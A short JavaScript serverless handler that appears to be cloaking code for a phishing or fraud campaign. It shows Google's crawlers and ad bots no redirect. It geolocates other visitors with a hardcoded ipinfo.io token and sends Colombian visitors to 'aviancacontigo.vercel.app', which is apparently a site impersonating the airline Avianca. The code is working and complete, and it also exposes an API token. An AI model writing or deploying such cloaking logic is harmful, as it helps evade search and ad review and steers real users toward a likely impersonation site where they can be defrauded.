export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const token = '3798a6699b4912';

  const esBotGoogle = /googlebot|adsbot-google/i.test(userAgent);
  if (esBotGoogle) {
    return res.status(200).json({ redirect: false });
  }

  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`);
    const data = await response.json();

    if (data.country === 'CO') {
      return res.status(200).json({ redirect: true, url: 'https://aviancacontigo.vercel.app' });
    }
  } catch (err) {
    console.error(err);
  }

  return res.status(200).json({ redirect: false });
}
